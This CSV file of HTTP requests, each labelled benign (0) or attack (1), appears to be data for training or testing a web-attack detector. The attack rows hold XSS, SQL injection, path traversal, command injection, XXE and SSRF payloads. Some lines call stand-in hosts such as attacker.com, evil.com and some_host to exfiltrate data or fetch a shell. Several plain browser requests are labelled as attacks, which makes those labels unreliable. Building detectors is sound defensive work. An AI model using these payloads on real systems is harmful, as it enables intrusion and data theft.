method,path,query,headers,body,ua,label
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/clause-update-3KL4RUvs.js,,,HTTP/1.1,,0
GET,../../../../etc/passwd%00,,,,,1
GET,/media/eval.jpg,,,HTTP/1.1,,0
GET,..%2f..%2f..%2fetc%2fshadow,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/assets/handler-onerror-fWo4uT3K.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,aaaa\u0027%2b#{16*8787}%2b\u0027bbb,,,,,1
GET,/static/js/where-tag-QfDPXruP.css,,,HTTP/1.1,,0
GET,/,?b87e1eadb1=sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml,,,,1
GET,//////////////////etc/passwd,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"alert.apply(null, [1])",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/widget-script-eOrCZMUv.css,,,HTTP/1.1,,0
GET,/media/delete-image-RObFxYX5.css,,,HTTP/1.1,,0
POST,/login,,,Content-Type: application/x-www-form-urlencoded user=john&pass=doe,,0
GET,' or '1'='1,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,"\""autof<x>ocus o<x>nfocus=alert<x>(1)//",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/alert-row-ULAG5959.jpg,,,HTTP/1.1,,0
GET,/assets/button-whoami-y47DKef5.css,,,HTTP/1.1,,0
GET,/static/js/from.min.js,,,HTTP/1.1,,0
GET,/build/alert-icon-olWnmMX8.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,?f24f266870=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/js/widget-union-8OZ0xbsA.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/update.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/css/select-date-3G50Dfno.woff2,,,HTTP/1.1,,0
GET,${os.system('id')},,,,,1
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,%0d%0aBcc: victim@example.com,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/static/css/drop.js,,,HTTP/1.1,,0
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,__proto__[admin]=true,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/media/cat.js,,,HTTP/1.1,,0
GET,/static/css/onerror-row-0oypEocR.css,,,HTTP/1.1,,0
,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,0
GET,/build/alert.min.css,,,HTTP/1.1,,0
GET,/static/js/cat.woff2,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/,&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE x [<!ENTITY % xxe PU BLIC ""any_text"" ""http://evil.com/evil.dtd"">%xxe;]><root>&xxe;</root>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,union select,,,,,1
GET,/media/type-from-Ls7vPpHY.svg,,,HTTP/1.1,,0
GET,/build/script.png,,,HTTP/1.1,,0
GET,/static/js/eval-clause-HmLLidSI.js,,,HTTP/1.1,,0
GET,"""><video><source onerror=eval(atob(http://some_host)) id=dmFyIGE9ZG9 jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5 ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#6 1;>",,,,,1
GET,/static/css/icon-script-bwrFQMsD.js,,,HTTP/1.1,,0
GET,/static/js/from.png,,,HTTP/1.1,,0
GET,/static/css/insert-widget-Jj3ZKjsb.jpg,,,HTTP/1.1,,0
GET,/media/dialog-insert-mQf2TtZ8.css,,,HTTP/1.1,,0
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,/build/select.png,,,HTTP/1.1,,0
GET,/assets/type-select-NRDheA1b.woff2,,,HTTP/1.1,,0
GET,id=1; DROP TABLE users--,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,/static/js/insert.svg,,,HTTP/1.1,,0
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/build/eval.woff2,,,HTTP/1.1,,0
GET,/static/css/alert-menu-OEUdU7XD.jpg,,,HTTP/1.1,,0
GET,/static/css/image-update-hrhYfChY.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/user/orders,status=shipped&from=2025-01-01,,,,0
GET,/,(&(uid=admin)(!(&(1=0)(userPassword=q)))),"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,__proto__[admin]=true,,,,1
GET,/assets/script-menu-eqQdk5IM.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/js/delete.min.js,,,HTTP/1.1,,0
GET,/build/from.js,,,HTTP/1.1,,0
GET,/assets/update-widget-0wGL3JF4.jpg,,,HTTP/1.1,,0
GET,javascript:setInterval('con'+'firm(document.domain)'),,,,,1
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,/,,,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,0
GET,/static/css/delete-row-cgB6gNMi.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/type-script-v2cQfRly.woff2,,,HTTP/1.1,,0
GET,/static/css/widget-update-P65XpDxT.png,,,HTTP/1.1,,0
GET,/static/js/script.min.css,,,HTTP/1.1,,0
GET,/static/js/select.js,,,HTTP/1.1,,0
GET,/assets/where.jpg,,,HTTP/1.1,,0
GET,/build/update-icon-vhW5DnQn.jpg,,,HTTP/1.1,,0
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,,,1
GET,/build/union.js,,,HTTP/1.1,,0
GET,/,?data=OltZJE7ZaPSLmXQJ5%2FpwgCMm%2Fkvon8HP9lmYJYHd6HGZj%2B1z6iPdTo2fAXFQjYu0uZBNAu5xKRVr1O8ayHk17emcTGlFS68UMh68sxuqrvU0c%2BsoUl9SZexU9E0ZFMryS6MuYuOlmCWzObu1S4zC9gdIZQe4voy%2Fn%2Fg4Joi7%2F0PVlz42BqHvOPJJ3GqdwNPWMtwlvGTX%2BnGXp6XhTnWQVAKjSmMWrfancspix9hJfuLtGqBXkszHCpNPvruc8shpHI4F%2FQMg0dO6cMvHYDqWadZVf68MPcP63pxKWklF8NXRmqzIa1fKuV0%3D&signature=6ce4e8ca1b6a6c2a7ecf58b6a7c2355b&subChannelCode=VBA&%3Cscript%3Ealert(1)%3C/script%3E,,,,1
GET,cat /etc/passwd,,,,,1
GET,/media/insert.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
,/api/health,,,,,0
GET,/assets/drop.js,,,HTTP/1.1,,0
GET,/media/select.svg,,,HTTP/1.1,,0
GET,/static/css/script.woff2,,,HTTP/1.1,,0
GET,db.injection.insert%28%7Bsuccess:1%7D%29%3B,,,,,1
GET,../../../../etc/passwd,,,,,1
GET,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,,,1
GET,/,,,,,0
GET,/build/from.png,,,HTTP/1.1,,0
GET,/static/js/select-function-LfqQnbqh.jpg,,,HTTP/1.1,,0
GET,/,dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,,,,1
GET,/static/js/insert.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,"{""alg"":""none""}",,1
GET,/media/eval-date-X5xvvXWi.png,,,HTTP/1.1,,0
GET,(alert)(1),,,,,1
GET,"<!DOCTYPE x SYSTEM ""//x/x"" > <x>a</x>",,,,,1
GET,/media/cat-form-aWPkYb4B.woff2,,,HTTP/1.1,,0
GET,/assets/from-handler-RoyMLEWn.svg,,,HTTP/1.1,,0
GET,/,token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NzIxODE2MDMsImlhdCI6MTc3MTkyMjQwMywidXNlciI6eyJncm91cF9pZCI6IjAxOWMwZTZlLWI0YTctNzRjYS05MGNlLTUyY2M0Njg5MzZjZSIsImxlYWRlcl9pZCI6IjAxOWMwOWU0LTNmY2QtNzc2ZS05ZGUwLWFiZGYyZjI3ZTYwMyIsInNlc3Npb25faWQiOiIwMTljOGVjZS0zMTkyLTc4MjQtYTI1OS0zZDZmM2JhM2NkM,,,,0
GET,id=1' OR '1'='1,,,,,1
GET,/build/drop.js,,,HTTP/1.1,,0
GET,query { __schema { types { name } } },,,,,1
GET,"<!--#exec cmd=""ls"" -->",,,,,1
GET,"/?q=%27admin%20%27OR%20%271%27=%271%27;-- Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",,,,,1
GET,/static/js/eval-row-tPQYdq23.svg,,,HTTP/1.1,,0
GET,/assets/where-function-2b1CNySq.jpg,,,HTTP/1.1,,0
GET,/build/cat.min.css,,,HTTP/1.1,,0
GET,select from,,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,"/""onClick=""(prompt)(1)",,,,1
GET,/static/js/cat-button-AHu03ea1.css,,,HTTP/1.1,,0
GET,;var date = new Date(); do{curDate = new Date();}while(curDate-date,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,http://169.254.169.254/latest/meta-data/,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/onerror-date-AVMFG3HL.js,,,HTTP/1.1,,0
GET,/build/onerror.svg,,,HTTP/1.1,,0
GET,/media/script-clause-yp6Om0tP.css,,,HTTP/1.1,,0
GET,/assets/widget-eval-2togCF9c.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/image-script-bFBjUtPa.woff2,,,HTTP/1.1,,0
GET,/build/dialog-eval-PizcDAZH.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,"(xss""><!--><svg/onload=alert(document.domain)>)",,,,1
GET,/,(&(uid=admin)(!(&(1=0)(userPassword=q)))),,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,cmd=127.0.0.1 && ls /etc,,,,,1
GET,/build/delete-icon-oFWqVTGg.css,,,HTTP/1.1,,0
GET,/,?de3c392736=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B,,,,1
GET,"<video src=x onerror=""prompt(xss"">",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/tag-alert-tLDeyFsi.css,,,HTTP/1.1,,0
POST,/user/password-update,,,"{""old"": ""pass1"", ""new"": ""pass2""}",,0
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/script.jpg,,,HTTP/1.1,,0
GET,/build/onerror.svg,,,HTTP/1.1,,0
GET,/static/css/type-cat-40QyxnlV.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/cat-form-6tWoJyTN.js,,,HTTP/1.1,,0
GET,/static/js/eval.css,,,HTTP/1.1,,0
GET,%0als,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/static/js/row-whoami-ylLZR8Gf.jpg,,,HTTP/1.1,,0
GET,(alert)(1),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,onerror=alert(1),,,,1
GET,/media/onerror-dialog-OUHGA6VV.js,,,HTTP/1.1,,0
GET,/,,,,,0
GET,0;var date=new Date(); do{curDate = new Date();}while(curDate-date<1 0000),,,,,1
GET,/build/insert.min.css,,,HTTP/1.1,,0
GET,/assets/type-onerror-2krrTj7j.svg,,,HTTP/1.1,,0
GET,/media/script-menu-ukDTrSZK.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/row-delete-3waiI724.js,,,HTTP/1.1,,0
GET,/static/css/whoami.min.css,,,HTTP/1.1,,0
GET,/assets/alert.min.js,,,HTTP/1.1,,0
GET,/build/insert-form-o2oTqFM5.js,,,HTTP/1.1,,0
GET,/build/type-eval-mrlsfKEX.css,,,HTTP/1.1,,0
GET,"alert.apply(null, [1])",,,,,1
GET,/build/function-script-kqyZC2ph.jpg,,,HTTP/1.1,,0
GET,/,dc1e09adea=%3Cimg%20src=x%20onerror=alert%28document.domain%29%3E%2Fall,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/static/js/whoami.js,,,HTTP/1.1,,0
GET,/media/menu-insert-rxfBWJIE.jpg,,,HTTP/1.1,,0
GET,"alert.apply(null, [1])",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/eval.js,,,HTTP/1.1,,0
GET,$(whoami),,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,?e804afb6a1=%3Cj%20id=x%20style=%22-webkit-user-modify:read-write%22%20onfocus=%7Bwindow.onerror=eval%7Dthrow%2F0%2F+name%3EH%3C%2Fj%3E%23x,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,id=1' OR '1'='1,,,,,1
GET,; /bin/c?t /e*c/p?sswd,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,|| ls -la,,,,,1
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/row-eval-NNwWq7tp.svg,,,HTTP/1.1,,0
GET,/media/update.js,,,HTTP/1.1,,0
GET,"""Onx=() onMouSeoVer=prompt(1)>",,,,,1
GET,/media/eval.svg,,,HTTP/1.1,,0
GET,union select,,,,,1
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/row-from-V8RQ6yAc.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/type-insert-jX7aL2gA.js,,,HTTP/1.1,,0
GET,/static/css/update.svg,,,HTTP/1.1,,0
GET,/static/css/clause-script-jaNkxGCZ.jpg,,,HTTP/1.1,,0
GET,/media/alert.woff2,,,HTTP/1.1,,0
GET,/build/type-union-ZAruHCrP.js,,,HTTP/1.1,,0
GET,/assets/insert-date-EoAFk8h4.woff2,,,HTTP/1.1,,0
GET,javascript:setInterval('ale'+'rt(document.domain)'),,,,,1
GET,1e1 union select users from password,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/cat-dialog-ySAhnXzy.css,,,HTTP/1.1,,0
GET,/assets/widget-delete-0HFpUrGf.js,,,HTTP/1.1,,0
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
GET,/assets/select.woff2,,,HTTP/1.1,,0
GET,/static/js/function-insert-2vEzWozX.jpg,,,HTTP/1.1,,0
GET,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(1 5)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/media/row-insert-MsYNUgfr.png,,,HTTP/1.1,,0
GET,..%c0%af..%c0%af..%c0%afetc/passwd,,,,,1
GET,/*!%55NiOn*/%20/*!%53eLEct*/+,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/assets/alert.jpg,,,HTTP/1.1,,0
GET,/build/from.svg,,,HTTP/1.1,,0
GET,/media/drop.jpg,,,HTTP/1.1,,0
GET,phar://path/to/malicious.phar/shell.php,,,,,1
GET,/static/js/cat-image-JbdzVXu6.js,,,HTTP/1.1,,0
GET,aaaa\u0027%2b#{16*8787}%2b\u0027bbb,,,,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://i d"">]><foo>&xxe;</foo>",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,"<!--#exec cmd=""wget http://some_host/shell.txt | rename shell.txt sh ell.php""-->",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,,,1
GET,/static/css/widget-where-f75j0SbT.js,,,HTTP/1.1,,0
GET,/static/css/where-clause-s9yqmqPB.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,?d7f86bf74f=123%29%20AND%2012=12%20%20AND%20JSON_DEPTH%28%27%7B%7D%27%29%20%21=%202521,,,,1
GET,/assets/drop-icon-lQdmy79c.woff2,,,HTTP/1.1,,0
GET,/media/insert.woff2,,,HTTP/1.1,,0
